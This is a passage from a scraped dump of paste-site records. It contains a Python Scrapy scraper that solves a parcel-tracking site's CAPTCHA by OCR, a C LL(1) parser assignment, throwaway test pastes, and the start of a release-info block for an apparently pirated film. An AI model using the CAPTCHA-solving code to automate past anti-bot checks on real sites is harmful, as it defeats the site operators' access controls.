cv2 image\n\xa0 \xa0 np_image = np.array(image)\n\xa0 \xa0 image = cv2.cvtColor(np_image, cv2.COLOR_RGB2BGR)\n\xa0 \xa0 image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\n\xa0 \xa0 \n\xa0 \xa0 # 2. split image to 4 character images\n\xa0 \xa0 # image_1, image_2, image_3, image_4 = split_image(image) \xa0\n\xa0 \xa0 images = split_image(image)\n\xa0 \xa0 \n\xa0 \xa0 # 3. deskew images\n\xa0 \xa0 for i in range(len(images)):\n\xa0 \xa0 \xa0 \xa0 images[i] = deskew_image(images[i])\n\xa0 \xa0 # image_1 = deskew_image(image_1)\n\xa0 \xa0 # image_2 = deskew_image(image_2)\n\xa0 \xa0 # image_3 = deskew_image(image_3)\n\xa0 \xa0 # image_4 = deskew_image(image_4)\n\xa0 \xa0 \n\xa0 \xa0 # 4. coordinate the characters \n\xa0 \xa0 for i in range(len(images)):\n\xa0 \xa0 \xa0 \xa0 coordinate_character(images[i])\n\xa0 \xa0 # image_1 = coordinate_character(image_1)\n\xa0 \xa0 # image_2 = coordinate_character(image_2)\n\xa0 \xa0 # image_3 = coordinate_character(image_3)\n\xa0 \xa0 # image_4 = coordinate_character(image_4)\n\xa0 \xa0 \n\xa0\n\xa0 \xa0 # 5. merge the images\n\xa0 \xa0 # image = np.concatenate((image_1, image_2, image_3, image_4), axis=1)\n\xa0 \xa0 image = np.concatenate(images, axis=1)\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 image = cv2.resize(image, (width * 4, height * 5), interpolation=cv2.INTER_AREA)\n\xa0 \xa0 cv2.imwrite(""output_image_rest_cn_2.png"", image)\n\xa0\n\xa0 \xa0 # convert cv2 image to PIL image\n\xa0 \xa0 image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)\n\xa0 \xa0 image = Image.fromarray(image)\n\xa0 \xa0 return image\n\xa0\nclass RETSCNScraper(BaseScraperItemPipeline, CookieMixin):\n\xa0 \xa0 name = ""RETSCNScraper""\n\xa0\n\xa0 \xa0 def __init__(self, name=None, **kwargs):\n\xa0 \xa0 \xa0 \xa0 super(RETSCNScraper, self).__init__(name, **kwargs)\n\xa0 \xa0 \xa0 \xa0 self.start_urls = [RETSCN_BASE_URL]\n\xa0 \xa0 \xa0 \xa0 self.max_retry = 0\n\xa0 \xa0 \xa0 \xa0 self.retry_count = 0\n\xa0\n\xa0 \xa0 def parse(self, response):\n\xa0 \xa0 \xa0 \xa0 self.update_local_cookie(response)\n\xa0 \xa0 \xa0 \xa0 try:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image = Image.open(io.BytesIO(response.body))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 # captcha_txt = post_process_captcha(pytesseract.image_to_string(image, config=\'--psm 13\'))\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 captcha_txt = post_process_captcha(\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pytesseract.image_to_string(preprocess_image(image))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 )\n\xa0 \xa0 \xa0 \xa0 except Exception:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 activity_logger.info(\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""{} {} cannot get captcha image"".format(self.name, self.parcel_id)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 )\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 return self.save_result([])\n\xa0\n\xa0 \xa0 \xa0 \xa0 print(""captcha result:"", captcha_txt)\n\xa0 \xa0 \xa0 \xa0 # Captcha always has 4 characters\n\xa0 \xa0 \xa0 \xa0 if captcha_txt and len(captcha_txt) == 4:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 formdata = {""danhao"": self.parcel_id, ""yanzhengma"": captcha_txt}\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 # After solving captcha and post to the endpoint it will return the actual track url\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 return self.produce_request(\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 FormRequest,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 RETSCN_TRACK_URL,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 formdata=formdata,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 cookies=self.cookies,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 method=""POST"",\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 callback=self.extract_data,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 errback=self.error_call_back,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 )\n\xa0 \xa0 \xa0 \xa0 elif self.retry_count < self.max_retry:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 return self.save_result([])\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 return self.save_result([])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 def extract_data(self, response):\n\xa0 \xa0 \xa0 \xa0 event_list = response.css("".text"")\n\xa0\n\xa0 \xa0 \xa0 \xa0 events = []\n\xa0 \xa0 \xa0 \xa0 if event_list:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 events = [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""event_type"": ""asdsad"",\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""event_time"": ""2022-03-12T12:30:00""\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0\n\xa0 \xa0 \xa0 \xa0 return self.save_result(events)', date='2022-06-01 08:36:58 +00:00', hash_val='01564311bbe1484a1f9dc5da1794d29d', url='/pUcaN6zw', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='maycod23', title='LL_1_Parser', content='// #include<iostream>\n// using namespace std;\n#include<stdio.h>\n#include<string.h>\n#define TSIZE 128\nint table[100][TSIZE];\nchar terminal[TSIZE];\nchar nonterminal[26];\nstruct product {\n\xa0 \xa0 char str[100];\n\xa0 \xa0 int len;\n} pro[20];\nint no_pro;\nchar first[26][TSIZE];\nchar follow[26][TSIZE];\nchar first_rhs[100][TSIZE];\nint isNT(char c) {return c >= \'A\' && c <= \'Z\';}\nvoid readFromFile()\n{ \xa0 FILE* fptr;\n\xa0 \xa0 fptr = fopen(""code.txt"", ""r"");\n\xa0 \xa0 char buffer[255];\n\xa0 \xa0 int i, j;\n\xa0 \xa0 while (fgets(buffer, sizeof(buffer), fptr)) {\n\xa0 \xa0 \xa0 \xa0 printf(""%s"", buffer);\n\xa0 \xa0 \xa0 \xa0 j = 0;\n\xa0 \xa0 \xa0 \xa0 nonterminal[buffer[0] - \'A\'] = 1;\n\xa0 \xa0 \xa0 \xa0 for (i = 0; i < strlen(buffer) - 1; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (buffer[i] == \'|\') {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ++no_pro;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro - 1].str[j] = \'\\0\';\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro - 1].len = j;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro].str[0] = pro[no_pro - 1].str[0];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro].str[1] = pro[no_pro - 1].str[1];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro].str[2] = pro[no_pro - 1].str[2];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 j = 3;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro].str[j] = buffer[i];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ++j;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (!isNT(buffer[i]) && buffer[i] != \'-\' && buffer[i] != \'>\') {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 terminal[buffer[i]] = 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 pro[no_pro].len = j;\n\xa0 \xa0 \xa0 \xa0 ++no_pro;\n\xa0 \xa0 }\n}\nvoid add_FIRST_A_to_FOLLOW_B(char A, char B)\n{ \xa0 int i;\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != \'^\')\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 follow[B - \'A\'][i] = follow[B - \'A\'][i] || first[A - \'A\'][i];\n\xa0 \xa0 }\n}\nvoid add_FOLLOW_A_to_FOLLOW_B(char A, char B)\n{ \xa0 int i;\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != \'^\')\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 follow[B - \'A\'][i] = follow[B - \'A\'][i] || follow[A - \'A\'][i];\n\xa0 \xa0 }\n}\nvoid FOLLOW()\n{ \xa0 int t = 0;\n\xa0 \xa0 int i, j, k, x;\n\xa0 \xa0 while (t++ < no_pro) {\n\xa0 \xa0 \xa0 \xa0 for (k = 0; k < 26; ++k) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (!nonterminal[k]) continue;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char nt = k + \'A\';\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 3; j < pro[i].len; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (nt == pro[i].str[j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (x = j + 1; x < pro[i].len; ++x) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char sc = pro[i].str[x];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (isNT(sc)) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 add_FIRST_A_to_FOLLOW_B(sc, nt);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first[sc - \'A\'][\'^\'])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 follow[nt - \'A\'][sc] = 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (x == pro[i].len)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 add_FOLLOW_A_to_FOLLOW_B(pro[i].str[0], nt);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n}\nvoid add_FIRST_A_to_FIRST_B(char A, char B) {\n\xa0 \xa0 int i;\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != \'^\') {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first[B - \'A\'][i] = first[A - \'A\'][i] || first[B - \'A\'][i];\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n}\nvoid FIRST() {\n\xa0 \xa0 int i, j;\n\xa0 \xa0 int t = 0;\n\xa0 \xa0 while (t < no_pro) {\n\xa0 \xa0 \xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 3; j < pro[i].len; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char sc = pro[i].str[j];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (isNT(sc)) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 add_FIRST_A_to_FIRST_B(sc, pro[i].str[0]);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first[sc\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][\'^\'])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first[pro[i].str[0]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][sc] = 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (j == pro[i].len)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first[pro[i].str[0]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][\'^\'] = 1;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 ++t;\n\xa0\n\xa0 \xa0 }\n}\nvoid add_FIRST_A_to_FIRST_RHS__B(char A, int B) {\n\xa0 \xa0 int i;\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != \'^\')\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first_rhs[B][i] = first[A\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][i] || first_rhs[B][i];\n\xa0\n\xa0 \xa0 }\n}\nvoid FIRST_RHS() {\n\xa0 \xa0 int i, j;\n\xa0 \xa0 int t = 0;\n\xa0 \xa0 while (t < no_pro) {\n\xa0 \xa0 \xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 3; j < pro[i].len; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char sc = pro[i].str[j];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (isNT(sc)) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 add_FIRST_A_to_FIRST_RHS__B(sc, i);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first[sc\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 - \'A\'][\'^\'])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first_rhs[i][sc] = 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (j == pro[i].len)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 first_rhs[i][\'^\'] = 1;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 ++t;\n\xa0\n\xa0 \xa0 }\n}\nint main() {\n\xa0 \xa0 printf(""UE193117 UDESH BIND PRODUCTIONS:"");\n\xa0 \xa0 readFromFile();\n\xa0 \xa0 follow[pro[0].str[0]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0- \'A\'][\'$\'] = 1;\n\xa0 \xa0 FIRST();\n\xa0 \xa0 FOLLOW();\n\xa0 \xa0 FIRST_RHS();\n\xa0 \xa0 int i, j, k;\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i == 0 || (pro[i - 1].str[0] != pro[i].str[0])) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char c = pro[i].str[0];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""FIRST OF %c: "", c);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first[c - \'A\'][j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%c "", j);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i == 0 || (pro[i - 1].str[0] != pro[i].str[0])) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char c = pro[i].str[0];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""FOLLOW OF %c: "", c);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (follow[c - \'A\'][j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%c "", j);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 printf(""FIRST OF %s: "", pro[i].str);\n\xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first_rhs[i][j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%c "", j);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 }\n\xa0 \xa0 terminal[\'$\'] = 1;\n\xa0 \xa0 terminal[\'^\'] = 0;\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 printf(""\\n\\t**************** LL(1) PARSING TABLE *******************\\n"");\n\xa0 \xa0 printf(""\\t--------------------------------------------------------\\n"");\n\xa0 \xa0 printf(""%-10s"", """");\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (terminal[i]) printf(""%-10c"", i);\n\xa0 \xa0 }\n\xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 int p = 0;\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != 0 && (pro[i].str[0] != pro[i - 1].str[0]))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 p = p + 1;\n\xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (first_rhs[i][j] && j != \'^\') {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 table[p][j] = i + 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else if (first_rhs[i][\'^\']) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (k = 0; k < TSIZE; ++k) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (follow[pro[i].str[0] - \'A\'][k]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 table[p][k] = i + 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 k = 0;\n\xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i == 0 || (pro[i - 1].str[0] != pro[i].str[0])) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%-10c"", pro[i].str[0]);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 0; j < TSIZE; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (table[k][j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%-10s"", pro[table[k][j] - 1].str);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else if (terminal[j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""%-10s"", """");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ++k;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 printf(""\\n"");\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 return 0;\n}', date='2022-06-01 08:34:17 +00:00', hash_val='fd44fd9f60762b088c18d5c71821c406', url='/qdR5zyy2', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='test 7', content='marvel super hero supercalifragilisticexpialidocious cape cloak villain', date='2022-06-01 08:25:17 +00:00', hash_val='79bef4879974aeaf07c8cbf1d9e35a8e', url='/rcX9dTCJ', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='test 5', content='yacht supercalifragilisticexpialidocious bosun deckhand stewardess', date='2022-06-01 08:23:15 +00:00', hash_val='9e9bb4e4aeadd80b4327c590edfbbf55', url='/2iPjcm3r', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='test 3', content='dave supercalifragilisticexpialidocious test', date='2022-06-01 08:20:16 +00:00', hash_val='37094481a6b74ce4d004113a2a875152', url='/srQ8CL61', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='trds', title='Untitled', content='[pre][b][font=Lucida Console][u]The.Contractor.2022.720p.BluRay.DD+5.1.x264-playHD[/u][/font][/b]\n\xa0\n[b][u]RELEASE iNFO:[/b][/u]\nRELEASE SIZE........: 6.24 GiB\nRUNTIME.............: 1 h 43 min\nVIDEO CODEC.........: x264, L4.1 @ CRF\nBITRATE.............: 7 621 kb/s\nRESOLUTION..........: 1280x536 pixels\nFRAMERATE...........: 23.976 (24000/1001) FPS\nAUDIO...............: English DD+5.1 at 1 024 kb/s \xa0\nSUBTITLES...........: English Forced \nSUBTITLES...........: English \xa0\nSUBTITLES...........: English SDH \nSUBTITLES...........: [b][color=#4bb702]Romanian[/b][/color] 